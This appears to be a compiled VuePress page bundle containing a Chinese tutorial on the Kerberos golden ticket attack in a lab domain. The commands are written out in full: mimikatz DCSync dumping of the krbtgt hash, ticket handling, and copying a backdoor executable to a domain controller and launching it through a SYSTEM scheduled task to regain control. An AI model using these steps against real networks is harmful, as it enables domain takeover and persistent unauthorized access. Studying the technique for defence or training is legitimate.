import{_ as o,W as c,X as i,Y as s,Z as e,a0 as n,a1 as t,C as r}from"./framework-b6a07282.js";const l="/assets/2-4407537e.jpg",h="/assets/1-ddaa8405.jpg",p="/assets/3-2e0ebfe3.jpg",d="/assets/4-ccb53589.jpg",u="/assets/5-18d27869.jpg",m={},k=t('<h2 id="kerberos黄金票据" tabindex="-1"><a class="header-anchor" href="#kerberos黄金票据" aria-hidden="true">#</a> Kerberos黄金票据</h2><h3 id="krbtgt账户介绍" tabindex="-1"><a class="header-anchor" href="#krbtgt账户介绍" aria-hidden="true">#</a> Krbtgt账户介绍</h3><ul><li>krbtgt用户，是系统在创建域时自动生成的一个帐号，其作用是密钥分发中心的服务账号，其密码是系统随机生成 的，无法进行登录。</li></ul><h4 id="黄金票据原理" tabindex="-1"><a class="header-anchor" href="#黄金票据原理" aria-hidden="true">#</a> 黄金票据原理</h4><p>前提：已经控制了域控并且使用管理员登陆或者是提权后的system</p><ul><li>TGT=Krbtgt的NTLM Hash加密</li></ul><ol><li>Kerberos中的TGT和Logon Session Key（CT_SK）是AS返回的，TGT它是由Krbtgt加密和签名的，Krbtgt的NTLM Hash又是固定的，而CT_SK并不会保存在KDC中。</li><li>所以只要得到Krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key（CT_SK）。</li><li>Client和TGS的交互中，有了金票（TGT）后，就可以跳过AS验证，不用验证用户名和密码，所以不用担心域管理员密码修改。</li></ol><p>当我们获得域控的控制权限后，有可能获取域内所有用户的hahs，和krbtgt的hahs。有可能存在一些原因，导致我们失去对目标的控制权，但是我们保留由一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以利用krbtgt用户的htlm hash制作黄金票据伪造TGT，重新获取域控的管理权限。</p><h3 id="实操" tabindex="-1"><a class="header-anchor" href="#实操" aria-hidden="true">#</a> 实操</h3><ul><li>前提：已经控制了域控并且使用管理员或提权到的System登陆</li></ul><p>如果域管理员发现了你控制了机器，把你后门删了，那么就不能继续控制域控了。但你已经收集好了制作黄金票据的信息，这时候我们可以伪造TGT重新获取域控的权限。</p><p>需要收集的信息：</p>',12),b={href:"http://hacker.com",target:"_blank",rel:"noopener noreferrer"},_=s("li",null,"域的SID：S-1-5-21-1094512304-651001315-2238218677",-1),g=s("li",null,"域的krbtgt用户的NTLM Hash：6d2859f1316b35c1b5a37cc1c3ccbe95",-1),T=s("li",null,"随便想一个用户名：testttt",-1),f=s("h4",{id:"一、收集信息",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#一、收集信息","aria-hidden":"true"},"#"),e(" 一、收集信息")],-1),v={href:"http://hacker.com",target:"_blank",rel:"noopener noreferrer"},K=t('<img src="'+l+'"><ol start="2"><li>shell whoami /user 域的SID为：S-1-5-21-1094512304-651001315-2238218677</li></ol><img src="'+h+'"><ol start="3"><li>使用mimikatz导出KRBTGT的ntlm hash mimikatz lsadump::dcsync /domain:hacker.com /user:krbtgt</li></ol><img src="'+p+`"><p>KRBTGT的NTLM Hash为：6d2859f1316b35c1b5a37cc1c3ccbe95</p><h4 id="二、制作黄金票据" tabindex="-1"><a class="header-anchor" href="#二、制作黄金票据" aria-hidden="true">#</a> 二、制作黄金票据</h4><p>假设现在域控后门被管理人员删除了，现在只控制了一台域内普通用户的机器。</p><ul><li>用户必须是域内用户或system用户</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>mimikatz kerberos::tgt <span class="token comment">#查票</span>
mimikatz kerberos::purge <span class="token comment">#清票</span>

制作完黄金票据后可执行以下命令：
shell <span class="token function">dir</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ControlFish.hacker.com<span class="token punctuation">\\</span>C$ <span class="token comment">#远程访问域控C盘</span>
shell copy c:<span class="token punctuation">\\</span>users<span class="token punctuation">\\</span>fish1<span class="token punctuation">\\</span>desktop<span class="token punctuation">\\</span>artifact.exe <span class="token punctuation">\\</span><span class="token punctuation">\\</span>ControlFish.hacker.com<span class="token punctuation">\\</span>c$ <span class="token comment">#复制后门文件到域控</span>
shell schtasks /create /s ControlFish.hacker.com /tn <span class="token builtin class-name">test</span> /sc onstart /tr c:<span class="token punctuation">\\</span>artifact.exe /ru system /f <span class="token comment">#给域控设置计划任务，启动后门。</span>
shell schtasks /run /s ControlFish.hacker.com /i /tn <span class="token string">&quot;test&quot;</span> <span class="token comment">#运行计划任务，域控重新上线</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><img src="`+d+'"><img src="'+u+'">',12);function x(S,C){const a=r("ExternalLinkIcon");return c(),i("div",null,[k,s("ol",null,[s("li",null,[e("域名称："),s("a",b,[e("hacker.com"),n(a)])]),_,g,T]),f,s("ol",null,[s("li",null,[e("输入：shell net config workstation 域名称为："),s("a",v,[e("hacker.com"),n(a)])])]),K])}const L=o(m,[["render",x],["__file","Kerberos黄金票据.html.vue"]]);export{L as default};
